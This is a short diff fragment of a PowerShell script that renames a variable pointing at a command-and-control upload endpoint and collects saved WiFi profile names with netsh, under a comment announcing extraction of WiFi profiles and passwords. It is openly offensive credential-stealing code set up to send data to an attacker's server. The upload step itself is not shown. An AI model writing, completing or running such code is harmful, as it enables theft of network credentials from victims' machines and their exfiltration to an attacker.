@@ -1,5 +1,5 @@
 # Define the C2 server endpoint
-$c2 = "http://<C2_PUBLIC_IP>/upload"
+$c2Url = "http://<C2_PUBLIC_IP>/upload"
 
 # Extract WiFi profiles and passwords
 $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":\s*")[1].Trim() }
